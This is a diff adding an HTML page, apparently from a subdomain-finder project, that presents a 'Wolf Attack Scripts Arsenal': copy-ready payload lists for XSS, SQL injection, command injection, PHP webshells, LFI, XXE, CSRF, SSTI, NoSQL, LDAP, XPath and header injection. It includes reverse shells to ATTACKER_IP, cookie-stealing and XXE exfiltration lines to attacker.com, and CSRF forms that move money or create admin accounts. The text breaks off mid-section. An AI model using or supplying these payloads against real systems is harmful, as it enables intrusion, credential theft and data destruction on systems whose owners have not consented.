@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🐺 Wolf Attack Scripts Arsenal - Cybersecurity Testing Suite</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="./assets/style.css">
+    <style>
+        .script-container {
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid #ff0000;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            position: relative;
+        }
+        
+        .script-header {
+            background: linear-gradient(45deg, #ff0000, #cc0000);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: between;
+            align-items: center;
+        }
+        
+        .script-content {
+            background: #000000;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-height: 300px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+        
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            z-index: 10;
+        }
+        
+        .attack-category {
+            border-left: 4px solid;
+            padding-left: 20px;
+            margin: 20px 0;
+        }
+        
+        .xss-category { border-left-color: #ff6b6b; }
+        .sqli-category { border-left-color: #4ecdc4; }
+        .rce-category { border-left-color: #45b7d1; }
+        .lfi-category { border-left-color: #96ceb4; }
+        .xxe-category { border-left-color: #ffeaa7; }
+        .csrf-category { border-left-color: #dda0dd; }
+        .ssti-category { border-left-color: #98d8c8; }
+        .nosql-category { border-left-color: #f7dc6f; }
+        
+        .severity-critical { border-left: 4px solid #dc3545; }
+        .severity-high { border-left: 4px solid #fd7e14; }
+        .severity-medium { border-left: 4px solid #ffc107; }
+        .severity-low { border-left: 4px solid #28a745; }
+        
+        .payload-stats {
+            display: flex;
+            gap: 15px;
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+        
+        .stat-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 5px 10px;
+            border-radius: 15px;
+            color: #ffffff;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-dark bg-dark fixed-top">
+        <div class="container-fluid">
+            <a class="navbar-brand fw-bold" href="index.html">🐺 Wolf Subdomain Finder</a>
+            <a class="navbar-brand" href="#xss-scripts">XSS Scripts</a>
+            <a class="navbar-brand" href="#sql-injection">SQL Injection</a>
+            <a class="navbar-brand" href="#rce-scripts">RCE Scripts</a>
+            <a class="navbar-brand" href="#advanced-payloads">Advanced</a>
+            <div class="d-flex align-items-center gap-2">
+                <button class="btn btn-outline-success btn-sm" onclick="exportAllScripts()">📥 Export All</button>
+                <button class="btn btn-outline-warning btn-sm" onclick="showPayloadGenerator()">🔧 Generator</button>
+                <button class="btn btn-outline-info btn-sm" onclick="showScriptStats()">📊 Stats</button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Header -->
+    <div class="container-fluid" style="margin-top: 80px;">
+        <div class="text-center mb-4">
+            <h1 class="display-4 fw-bold" style="color: #ff0000; text-shadow: 0 0 20px rgba(255, 0, 0, 0.8);">
+                🐺 WOLF ATTACK SCRIPTS ARSENAL 🐺
+            </h1>
+            <p class="lead text-white">
+                Comprehensive Cybersecurity Testing Scripts Collection
+            </p>
+            <div class="payload-stats">
+                <div class="stat-item">
+                    <strong id="totalPayloads">500+</strong> Payloads
+                </div>
+                <div class="stat-item">
+                    <strong>15+</strong> Attack Types
+                </div>
+                <div class="stat-item">
+                    <strong>100+</strong> Bypass Techniques
+                </div>
+                <div class="stat-item">
+                    <strong>50+</strong> Encoding Methods
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- XSS Attack Scripts -->
+    <div class="container-fluid attack-category xss-category" id="xss-scripts">
+        <h2 class="text-danger mb-4">🚨 XSS (Cross-Site Scripting) Payloads</h2>
+        
+        <!-- Basic XSS -->
+        <div class="script-container severity-critical">
+            <div class="script-header">
+                <h5 class="mb-0">Basic XSS Payloads</h5>
+                <span class="badge bg-danger">Critical</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content" id="basic-xss">
+<!-- Basic XSS Payloads -->
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(window.location)</script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+
+<!-- HTML Event Handlers -->
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+<video><source onerror="alert('XSS')">
+<audio src=x onerror=alert('XSS')>
+
+<!-- JavaScript URLs -->
+javascript:alert('XSS')
+javascript:alert(document.cookie)
+javascript:alert(document.domain)
+javascript:window.location='http://attacker.com/steal.php?cookie='+document.cookie
+
+<!-- Data URLs -->
+data:text/html,<script>alert('XSS')</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+            </div>
+        </div>
+
+        <!-- Advanced XSS -->
+        <div class="script-container severity-high">
+            <div class="script-header">
+                <h5 class="mb-0">Advanced XSS Payloads</h5>
+                <span class="badge bg-warning">High</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- DOM-based XSS -->
+<script>
+document.write('<img src=x onerror=alert("XSS")>');
+document.getElementById('test').innerHTML = '<script>alert("XSS")<\/script>';
+eval('alert("XSS")');
+setTimeout('alert("XSS")', 1000);
+setInterval('alert("XSS")', 1000);
+Function('alert("XSS")')();
+</script>
+
+<!-- Bypass Filters -->
+<ScRiPt>alert('XSS')</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(/XSS/.source)</script>
+<script>alert`XSS`</script>
+<script>(alert)('XSS')</script>
+<script>window['alert']('XSS')</script>
+<script>top['alert']('XSS')</script>
+<script>parent['alert']('XSS')</script>
+<script>self['alert']('XSS')</script>
+
+<!-- Encoded Payloads -->
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+\u003cscript\u003ealert('XSS')\u003c/script\u003e
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+
+<!-- Filter Bypass Techniques -->
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
+<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
+<img src="x" onerror="window[atob('YWxlcnQ=')]('XSS')">
+            </div>
+        </div>
+
+        <!-- XSS Polyglots -->
+        <div class="script-container severity-high">
+            <div class="script-header">
+                <h5 class="mb-0">XSS Polyglots</h5>
+                <span class="badge bg-warning">High</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- XSS Polyglots - Work in multiple contexts -->
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
+
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(document.cookie)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
+
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+            </div>
+        </div>
+    </div>
+
+    <!-- SQL Injection Scripts -->
+    <div class="container-fluid attack-category sqli-category" id="sql-injection">
+        <h2 class="text-info mb-4">💉 SQL Injection Payloads</h2>
+        
+        <!-- Basic SQL Injection -->
+        <div class="script-container severity-critical">
+            <div class="script-header">
+                <h5 class="mb-0">Basic SQL Injection</h5>
+                <span class="badge bg-danger">Critical</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- Basic SQL Injection Payloads -->
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR '1'='1
+') OR ('1'='1
+' OR 1=1 LIMIT 1--
+' OR 1=1 ORDER BY 1--
+' OR 1=1 GROUP BY 1--
+
+<!-- Authentication Bypass -->
+admin'--
+admin'#
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+' or 1=1 LIMIT 1--
+' or 1=1 ORDER BY 1--
+' or 1=1 GROUP BY 1--
+
+<!-- Union-based SQL Injection -->
+' UNION SELECT 1,2,3--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT 1,2,3--
+' UNION SELECT user(),database(),version()--
+' UNION SELECT table_name,column_name,1 FROM information_schema.columns--
+
+<!-- Error-based SQL Injection -->
+' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT((SELECT version()),FLOOR(RAND(0)*2)))--
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+            </div>
+        </div>
+
+        <!-- Advanced SQL Injection -->
+        <div class="script-container severity-high">
+            <div class="script-header">
+                <h5 class="mb-0">Advanced SQL Injection</h5>
+                <span class="badge bg-warning">High</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- Time-based Blind SQL Injection -->
+' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT pg_sleep(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+
+<!-- Boolean-based Blind SQL Injection -->
+' AND (SELECT SUBSTRING(@@version,1,1))='5'--
+' AND (SELECT SUBSTRING(user(),1,1))='r'--
+' AND (SELECT SUBSTRING(database(),1,1))='t'--
+' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())>0--
+
+<!-- Second-order SQL Injection -->
+admin'; INSERT INTO users (username,password) VALUES ('hacker','password123');--
+admin'; UPDATE users SET password='hacked' WHERE username='admin';--
+admin'; DROP TABLE users;--
+
+<!-- WAF Bypass Techniques -->
+/*!50000SELECT*/ * /*!50000FROM*/ users
+/**/UNION/**/SELECT/**/
++UNION+SELECT+
+UNION(SELECT(column)FROM(table))
+UNION%0ASELECT%0A
+UNI/**/ON SE/**/LECT
+%55%4e%49%4f%4e %53%45%4c%45%43%54
+UNION SELECT CHAR(65,66,67)
+
+<!-- Database-specific Payloads -->
+-- MySQL
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+' UNION SELECT @@version,@@datadir,@@hostname,@@basedir--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+
+-- PostgreSQL
+'; SELECT version();--
+'; SELECT current_database();--
+'; SELECT current_user;--
+
+-- MSSQL
+'; SELECT @@version;--
+'; SELECT DB_NAME();--
+'; SELECT SYSTEM_USER;--
+'; EXEC xp_cmdshell('whoami');--
+
+-- Oracle
+' UNION SELECT banner FROM v$version--
+' UNION SELECT user FROM dual--
+' UNION SELECT table_name FROM all_tables--
+            </div>
+        </div>
+    </div>
+
+    <!-- Remote Code Execution Scripts -->
+    <div class="container-fluid attack-category rce-category" id="rce-scripts">
+        <h2 class="text-primary mb-4">💻 Remote Code Execution (RCE) Payloads</h2>
+        
+        <!-- Command Injection -->
+        <div class="script-container severity-critical">
+            <div class="script-header">
+                <h5 class="mb-0">Command Injection Payloads</h5>
+                <span class="badge bg-danger">Critical</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- Basic Command Injection -->
+; whoami
+| whoami
+& whoami
+&& whoami
+|| whoami
+` whoami `
+$(whoami)
+${whoami}
+
+<!-- Linux Commands -->
+; cat /etc/passwd
+; ls -la /
+; id
+; uname -a
+; ps aux
+; netstat -an
+; ifconfig
+; pwd
+; env
+; history
+
+<!-- Windows Commands -->
+; dir
+; type C:\Windows\System32\drivers\etc\hosts
+; whoami /all
+; systeminfo
+; tasklist
+; netstat -an
+; ipconfig /all
+; net user
+; net localgroup administrators
+
+<!-- Reverse Shell Payloads -->
+; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+; nc -e /bin/sh ATTACKER_IP 4444
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+; perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+<!-- Bypass Techniques -->
+w'h'o'a'm'i
+w"h"o"a"m"i
+who$@ami
+wh${@}oami
+w\ho\am\i
+echo "whoami" | sh
+printf "whoami" | sh
+cat<<<$(whoami)
+            </div>
+        </div>
+
+        <!-- PHP Code Injection -->
+        <div class="script-container severity-critical">
+            <div class="script-header">
+                <h5 class="mb-0">PHP Code Injection</h5>
+                <span class="badge bg-danger">Critical</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- PHP Code Injection Payloads -->
+<?php system($_GET['cmd']); ?>
+<?php exec($_GET['cmd']); ?>
+<?php shell_exec($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+<?php eval($_GET['cmd']); ?>
+<?php assert($_GET['cmd']); ?>
+<?php file_get_contents($_GET['file']); ?>
+<?php include($_GET['file']); ?>
+<?php require($_GET['file']); ?>
+
+<!-- PHP Webshells -->
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+<?php $cmd=$_GET['cmd']; if($cmd != '') { echo shell_exec($cmd); } ?>
+<?php                                      ?>
+<?php @eval($_POST['c']); ?>
+
+<!-- PHP Filter Bypass -->
+<?=`$_GET[0]`?>
+<?=system($_GET[0]);?>
+<? system($_GET['cmd']); ?>
+<script language="php">system($_GET['cmd']);</script>
+
+<!-- Advanced PHP Payloads -->
+<?php
+$cmd = $_GET['cmd'];
+if($cmd) {
+    $output = shell_exec($cmd . ' 2>&1');
+    echo "<pre>$output</pre>";
+}
+?>
+
+<?php
+function execute($cmd) {
+    $methods = array('system', 'exec', 'shell_exec', 'passthru');
+    foreach($methods as $method) {
+        if(function_exists($method)) {
+            return $method($cmd);
+        }
+    }
+    return false;
+}
+echo execute($_GET['cmd']);
+?>
+            </div>
+        </div>
+    </div>
+
+    <!-- Local File Inclusion Scripts -->
+    <div class="container-fluid attack-category lfi-category" id="lfi-scripts">
+        <h2 class="text-success mb-4">📁 Local File Inclusion (LFI) Payloads</h2>
+        
+        <div class="script-container severity-high">
+            <div class="script-header">
+                <h5 class="mb-0">LFI & Path Traversal</h5>
+                <span class="badge bg-warning">High</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- Basic LFI Payloads -->
+../../../etc/passwd
+..\..\..\..\windows\system32\drivers\etc\hosts
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+
+<!-- Linux Files -->
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/motd
+/etc/issue
+/proc/version
+/proc/cmdline
+/proc/self/environ
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/home/user/.bash_history
+/root/.bash_history
+
+<!-- Windows Files -->
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\Windows\win.ini
+C:\Windows\system.ini
+C:\Windows\boot.ini
+C:\inetpub\logs\LogFiles\W3SVC1\
+C:\Program Files\Apache Group\Apache2\logs\access.log
+
+<!-- PHP Wrappers -->
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+php://input
+data://text/plain,<?php system($_GET['cmd']);?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+
+<!-- Log Poisoning -->
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/mail.log
+/var/log/auth.log
+/proc/self/environ
+
+<!-- Bypass Techniques -->
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+....\/....\/....\/etc/passwd
+...\....\....\etc\passwd
+            </div>
+        </div>
+    </div>
+
+    <!-- XXE Injection Scripts -->
+    <div class="container-fluid attack-category xxe-category" id="xxe-scripts">
+        <h2 class="text-warning mb-4">🔥 XXE (XML External Entity) Payloads</h2>
+        
+        <div class="script-container severity-high">
+            <div class="script-header">
+                <h5 class="mb-0">XXE Injection Payloads</h5>
+                <span class="badge bg-warning">High</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- Basic XXE Payloads -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
+<root>&xxe;</root>
+
+<!-- Blind XXE -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+<root></root>
+
+<!-- XXE with Parameter Entities -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+]>
+<root></root>
+
+<!-- XXE SSRF -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">]>
+<root>&xxe;</root>
+
+<!-- XXE with CDATA -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % stuff SYSTEM "file:///etc/passwd">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<root>&all;</root>
+
+<!-- Advanced XXE -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY % sp SYSTEM "http://attacker.com/evil.dtd">
+%sp;
+%param1;
+]>
+<foo>&exfil;</foo>
+            </div>
+        </div>
+    </div>
+
+    <!-- CSRF Scripts -->
+    <div class="container-fluid attack-category csrf-category" id="csrf-scripts">
+        <h2 class="text-light mb-4" style="color: #dda0dd !important;">🎭 CSRF (Cross-Site Request Forgery) Payloads</h2>
+        
+        <div class="script-container severity-medium">
+            <div class="script-header">
+                <h5 class="mb-0">CSRF Attack Payloads</h5>
+                <span class="badge bg-info">Medium</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- Basic CSRF HTML Form -->
+<html>
+<body>
+<form action="http://victim.com/change-password" method="POST">
+    <input type="hidden" name="new_password" value="hacked123">
+    <input type="hidden" name="confirm_password" value="hacked123">
+    <input type="submit" value="Click here for free gift!">
+</form>
+</body>
+</html>
+
+<!-- Auto-submit CSRF -->
+<html>
+<body onload="document.forms[0].submit()">
+<form action="http://victim.com/transfer-money" method="POST">
+    <input type="hidden" name="amount" value="10000">
+    <input type="hidden" name="to_account" value="attacker_account">
+</form>
+</body>
+</html>
+
+<!-- CSRF with JavaScript -->
+<script>
+function csrf() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://victim.com/delete-account", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send("confirm=yes");
+}
+csrf();
+</script>
+
+<!-- CSRF with Image Tag -->
+<img src="http://victim.com/delete-user?id=123" style="display:none;">
+
+<!-- CSRF with Fetch API -->
+<script>
+fetch('http://victim.com/admin/add-user', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+        username: 'hacker',
+        password: 'password123',
+        role: 'admin'
+    })
+});
+</script>
+
+<!-- CSRF Token Bypass -->
+<script>
+// First request to get CSRF token
+fetch('/get-csrf-token')
+.then(response => response.json())
+.then(data => {
+    // Second request with token
+    fetch('/sensitive-action', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRF-Token': data.token
+        },
+        body: JSON.stringify({action: 'delete_all'})
+    });
+});
+</script>
+            </div>
+        </div>
+    </div>
+
+    <!-- SSTI Scripts -->
+    <div class="container-fluid attack-category ssti-category" id="ssti-scripts">
+        <h2 class="text-info mb-4">🔧 SSTI (Server-Side Template Injection) Payloads</h2>
+        
+        <div class="script-container severity-high">
+            <div class="script-header">
+                <h5 class="mb-0">SSTI Payloads</h5>
+                <span class="badge bg-warning">High</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- Jinja2 (Python Flask) -->
+{{7*7}}
+{{config}}
+{{config.items()}}
+{{get_flashed_messages.__globals__['current_app'].config}}
+{{url_for.__globals__['current_app'].config}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+
+<!-- Advanced Jinja2 RCE -->
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+{{''.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{lipsum.__globals__['os'].popen('whoami').read()}}
+{{cycler.__init__.__globals__.os.popen('whoami').read()}}
+
+<!-- Twig (PHP) -->
+{{7*7}}
+{{_self}}
+{{_self.env}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+
+<!-- Twig RCE -->
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+{{_self.env.enableDebug()}}{{_self.env.enableAutoReload()}}{{_self.env.setCache(false)}}{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
+
+<!-- Smarty (PHP) -->
+{$smarty.version}
+{php}echo `whoami`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+<!-- Freemarker (Java) -->
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
+<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ ex("java.lang.ProcessBuilder","whoami").start() }
+
+<!-- Velocity (Java) -->
+#set($ex=$rt.getRuntime().exec("whoami"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+<!-- Handlebars -->
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+            </div>
+        </div>
+    </div>
+
+    <!-- NoSQL Injection Scripts -->
+    <div class="container-fluid attack-category nosql-category" id="nosql-scripts">
+        <h2 class="text-warning mb-4">🍃 NoSQL Injection Payloads</h2>
+        
+        <div class="script-container severity-high">
+            <div class="script-header">
+                <h5 class="mb-0">NoSQL Injection</h5>
+                <span class="badge bg-warning">High</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- MongoDB Injection -->
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"$where": "this.username == this.password"}
+{"$where": "1==1"}
+{"$where": "return true"}
+
+<!-- MongoDB Authentication Bypass -->
+username[$ne]=admin&password[$ne]=admin
+username[$regex]=.*&password[$regex]=.*
+username[$gt]=&password[$gt]=
+username[$nin][]=admin&username[$nin][]=test&password[$ne]=admin
+
+<!-- MongoDB Blind Injection -->
+{"username": "admin", "password": {"$regex": "^a.*"}}
+{"username": "admin", "password": {"$regex": "^ad.*"}}
+{"username": "admin", "password": {"$regex": "^adm.*"}}
+
+<!-- CouchDB Injection -->
+{"selector": {"_id": {"$gt": null}}}
+{"selector": {"$and": [{"username": {"$eq": "admin"}}, {"password": {"$regex": ".*"}}]}}
+
+<!-- Advanced NoSQL Payloads -->
+{"username": {"$func": "var_dump"}}
+{"username": {"$f": "var_dump"}}
+{"username": {"$where": "sleep(5000)"}}
+{"username": {"$where": "this.username.match(/.*admin.*/)"}}
+
+<!-- JavaScript Injection in NoSQL -->
+'; return db.users.find(); var dummy='
+'; return db.users.drop(); var dummy='
+'; return db.runCommand("listCollections"); var dummy='
+            </div>
+        </div>
+    </div>
+
+    <!-- Advanced Payloads -->
+    <div class="container-fluid attack-category" id="advanced-payloads">
+        <h2 class="text-danger mb-4">🚀 Advanced Attack Payloads</h2>
+        
+        <!-- LDAP Injection -->
+        <div class="script-container severity-medium">
+            <div class="script-header">
+                <h5 class="mb-0">LDAP Injection</h5>
+                <span class="badge bg-info">Medium</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- LDAP Injection Payloads -->
+*
+*)(&
+*))%00
+)(cn=*)
+)(|(cn=*))
+*)(uid=*))(|(uid=*
+*)(uid=*))((|uid=*
+*)(|(uid=*)(uid=*))
+admin)(&(password=*))
+admin)(!(&(password=*))
+
+<!-- LDAP Authentication Bypass -->
+(&(objectClass=user)(|(cn=*)(uid=*)))
+(&(objectClass=person)(|(cn=*)(uid=*)))
+(|(cn=admin)(uid=admin))
+(|(cn=*)(uid=*))
+            </div>
+        </div>
+
+        <!-- XPath Injection -->
+        <div class="script-container severity-medium">
+            <div class="script-header">
+                <h5 class="mb-0">XPath Injection</h5>
+                <span class="badge bg-info">Medium</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- XPath Injection Payloads -->
+' or '1'='1
+' or 1=1 or ''='
+' or 1=1 or 'a'='a
+') or '1'='1
+') or 1=1 or ('a'='a
+')] | //user/*[contains(*,'
+')] | //user/*[contains(*,'admin')] | //user/*[contains(*,'
+' or count(parent::*[position()=1])=0 or 'a'='b
+' or count(preceding-sibling::*)=0 or 'a'='b
+' or count(following-sibling::*)=0 or 'a'='b
+' or count(ancestor::*)=0 or 'a'='b
+            </div>
+        </div>
+
+        <!-- HTTP Header Injection -->
+        <div class="script-container severity-medium">
+            <div class="script-header">
+                <h5 class="mb-0">HTTP Header Injection</h5>
+                <span class="badge bg-info">Medium</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- HTTP Header Injection Payloads -->
+%0d%0aSet-Cookie:%20admin=true
+%0d%0aLocation:%20http://attacker.com
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Hacked</html>
+
+<!-- CRLF Injection -->
+%0D%0ASet-Cookie:admin=true
